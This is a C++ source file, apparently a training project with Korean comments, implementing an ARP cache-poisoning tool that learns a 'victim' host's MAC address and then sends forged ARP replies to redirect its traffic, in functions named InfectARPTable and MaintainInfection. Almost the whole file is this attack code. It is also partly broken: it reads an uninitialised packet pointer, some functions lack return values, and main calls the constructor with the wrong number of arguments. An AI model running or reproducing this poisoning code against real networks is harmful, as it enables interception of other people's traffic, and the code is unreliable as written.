
#include "send_arp.h"


SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP, PcapManager *pcapManager)
{
    this->interface = interface;
    this->senderIP = senderIP;
    this->targetIP = targetIP;

    this ->pcapManager = pcapManager;
    //내 MAC, IP 주소 설정
    SetMyAddr(interface);
    
} //SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP)


void SendARP::SetMyAddr(uint8_t * interface)
{

    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, (char *)interface);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
    {
        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
    }
    else
    {
        printf("Fail to get my MAC address!\n");
        exit(1);
    }

    s.ifr_addr.sa_family = AF_INET;

    if (0 == ioctl(fd, SIOCGIFADDR, &s))
    {
        myIP = (uint32_t)(((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr);

    }
    else
    {
        printf("Fail to get my IP address!\n");
        exit(1);

    }

    close(fd);

} //void SetMyMAC(uint8_t * interface)


bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
{

    uint8_t requestMAC[ETH_ALEN];

    switch(arpType)
    {
    case ARPOP_REQUEST: 
       
        //ethernet header for broadcast
        memset(requestMAC, 0xFF, sizeof(requestMAC));
        MakeEtherHeader( &(buf->eth), requestMAC, srcMAC);

        //ARP dstMAC for request
        memset(requestMAC, 0x00, sizeof(requestMAC));
        dstMAC = requestMAC;
        
        break;

    case ARPOP_REPLY:

        MakeEtherHeader( &(buf->eth), dstMAC, srcMAC); 
    
        break;

    } // switch(arpType)

    //header
    buf->arp.hardType  = htons(ARPHRD_ETHER);
    buf->arp.protoType = htons(ETHERTYPE_IP);
    buf->arp.hardLen = ETH_ALEN;
    buf->arp.protoLen = (uint8_t)Len::IPADDRLEN;
    buf->arp.opcode = htons(arpType); 

    //내용
    memcpy((char *) buf->arp.srcMAC, (char * )srcMAC, ETH_ALEN);
    buf->arp.srcIP = srcIP;
    memcpy((char *) buf->arp.dstMAC, (char * )dstMAC, ETH_ALEN);
    buf->arp.dstIP = dstIP;

} //bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)


void SendARP::MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
{
    memcpy((char *)eth->ether_dhost, (char*) dstMAC, ETH_ALEN);
    memcpy((char *)eth->ether_shost, (char*) srcMAC, ETH_ALEN);    
    eth->ether_type = htons(ETHERTYPE_ARP);

} //void SendARP::MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)



bool SendARP::InfectARPTable()
{
    ARPPACKET buf;
    //pcap_t * handle;
    uint8_t errbuf[PCAP_ERRBUF_SIZE];

    char print_senderIP[20];
    char print_targetIP[20];
    inet_ntop(AF_INET, (const void *)&senderIP, print_senderIP, sizeof(print_senderIP));
    inet_ntop(AF_INET, (const void *)&targetIP, print_targetIP, sizeof(print_targetIP));


    if(isBuilt)
    {
        //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
        pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);
        return false;
    }

    //handle = pcap_open_live((const char *)interface, BUFSIZ, 1, 500, (char *)errbuf);
    /*
    if (handle == NULL) 
    {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
        return false;
    }*/

    SetMyAddr(interface);

    //--- get sender's MAC ---
    
    MakeARP(ARPOP_REQUEST, &buf, NULL, myMAC, senderIP, myIP);
    
    
    //get response
    bool getResponse = false;
    
    //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
    pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);

    struct timeval tv;
    gettimeofday (&tv, NULL);
    long oldTime= (tv.tv_sec * 1000);

    while (!getResponse) 
    {
        const uint8_t * packet;
        /*
        struct pcap_pkthdr * header;
        

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        */

       //////////////
       //
       //
       //패킷이 올 때까지 기다림
       //
       ////////////////


        //ARP 응답인지 체크
        getResponse = GetSenderMAC((uint8_t *)packet);
        
        if(getResponse == true)
            break;

        //5초에 한 번씩 시도
        else
        {
            gettimeofday (&tv, NULL);

            long passedTime = (tv.tv_sec *1000 -oldTime) /1000;
        
            if(passedTime >5 || passedTime <0)
            {
                oldTime = tv.tv_sec *1000;
                printf("retry to get sender MAC : sender [%s] target [%s] %d\n", print_senderIP, print_targetIP, passedTime);
            
               // pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
                pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);

            }

        } //else -  if(getResponse == true)

    } //while (!getResponse) 


    //___ get sender's MAC ___


    //--- infect ARP Table ---

    memset(&buf, 0, sizeof(buf));

    MakeARP(ARPOP_REPLY, &buf, senderMAC, myMAC, senderIP, targetIP);
    

    printf("infect ARP table : sender [%s] target [%s]\n", print_senderIP, print_targetIP);
    
    //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
    pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);
    //___ infect ARP Table ___
    isBuilt =  true;
    return true;

}


bool SendARP::MaintainInfection()
{

    struct timeval tv;
    gettimeofday (&tv, NULL);
    long oldTime= (tv.tv_sec * 1000);


    if(!isBuilt)
        return false;
    
    

    //주기적으로 패킷 전송
    while(true)   
    {
        gettimeofday (&tv, NULL);
        long passedTime = (tv.tv_sec *1000 -oldTime) /1000;
        
        if(passedTime >5 || passedTime <0)
        {
         //    pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
        }


    }



}




bool SendARP::GetSenderMAC(uint8_t * packet)
{

    ARPPACKET * arpPacket = (ARPPACKET * )packet;

    //수신한 패킷인지 체크
    if(memcmp(arpPacket->eth.ether_dhost, myMAC, ETH_ALEN))
    {
       return false; 
    }

    //arp 패킷인지 체크
    if(! IsARPNext(arpPacket->eth.ether_type))
        return false;

    //victim에게 온 response인지 체크
    if(!IsSenderIP(arpPacket->arp.srcIP))
    {
        return false;
    }

    //victim의 MAC 주소를 얻음
    memcpy(senderMAC, arpPacket->eth.ether_shost, ETH_ALEN);

    return true;


} //bool SendARP::GetSenderMAC(ARPPACKET * packet)



bool SendARP::IsARPNext(uint16_t ethType)
{
    if (ntohs(ethType) == ETHERTYPE_ARP)
        return true;
    else  
        return false;

} //bool IsARPNext(uint16_t ethType)


bool SendARP::IsSenderIP(uint32_t ip)
{
    if (ip == senderIP)
        return true;
    else
        return false;

} //bool SendARP::IsSenderIP(uint32_t ip)



int main(int argc, char * argv[])
{
    
    SendARP a( (uint8_t *)argv[1], (uint32_t)inet_addr(argv[2]), (uint32_t)inet_addr(argv[3]));

    a.InfectARPTable();
 
}
